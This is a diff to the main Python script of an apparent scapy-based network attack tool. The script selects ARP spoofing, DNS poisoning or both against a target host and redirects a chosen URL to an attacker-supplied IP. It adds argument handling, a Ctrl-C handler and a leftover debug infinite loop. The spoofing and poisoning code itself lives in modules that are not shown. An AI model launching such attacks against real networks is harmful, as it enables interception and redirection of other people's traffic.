@@ -3,6 +3,7 @@ import threading
 from scapy.all import *
 from ArpSpoofing import ArpSpoofing
 from DnsPoisoning import DnsPoisoning
+import signal
 
 if __name__ == "__main__":
     #global variables
@@ -12,11 +13,26 @@ if __name__ == "__main__":
     interface = "enp0s3"
     arpSpoof = None
     dnsPoison = None
+    hostToAttack = None
+    hostToSpoof = None
+    ipToSendTo = None
+    url = None
 
+
+    def keyboardInterruptHandler(signal, frame):
+        print("KeyboardInterrupt has been caught. Cleaning up")
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, keyboardInterruptHandler)
+
+
+
+    '''
     #checks if amount of passed arguments is correct
     if len(sys.argv) != argReq:
         print("Wrong amount of arguments provide", argReq-1, "arguments")
         sys.exit(1)
+    '''
 
     #makes a list of passed arguments
     for item in arguments[1:]:
@@ -26,11 +42,34 @@ if __name__ == "__main__":
 
     #Stores arguments in correct variables
     modeOfAttack = listArguments[0]
-    hostToAttack = listArguments[1]
-    hostToSpoof = listArguments[2]
-    ipToSendTo = listArguments[3]
-    url = listArguments[4]
 
+    if modeOfAttack == "arp":
+        if len(listArguments) != 3:
+            print("Wrong amount of arguments provided, exiting...")
+            sys.exit(0)
+        else:
+            hostToAttack = listArguments[1]
+            hostToSpoof = listArguments[2]
+    elif modeOfAttack == "dns":
+        if len(listArguments) != 4:
+            print("Wrong amount of arguments provided, exiting...")
+            sys.exit(0)
+        else:
+            hostToAttack = listArguments[1]
+            ipToSendTo = listArguments[2]
+            url = listArguments[3]
+    elif modeOfAttack == "all":
+        if len(listArguments) != 5:
+            print("Wrong amount of arguments provided, exiting...")
+            sys.exit(0)
+        else:
+            hostToAttack = listArguments[1]
+            hostToSpoof = listArguments[2]
+            ipToSendTo = listArguments[3]
+            url = listArguments[4]
+
+    while True:
+        print('x')
 
     if modeOfAttack == "arp":
         arpSpoofing = ArpSpoofing(interface)
@@ -56,8 +95,9 @@ if __name__ == "__main__":
         dnsPoisoning = DnsPoisoning(interface)
         try:
             arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(hostToAttack, hostToSpoof))
-            arpSpoof.start()
             arpSpoof.daemon = True
+            arpSpoof.start()
+            print("one thread created")
             dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(hostToAttack, url, ipToSendTo))
             dnsPoison.daemon = True
             dnsPoison.start()
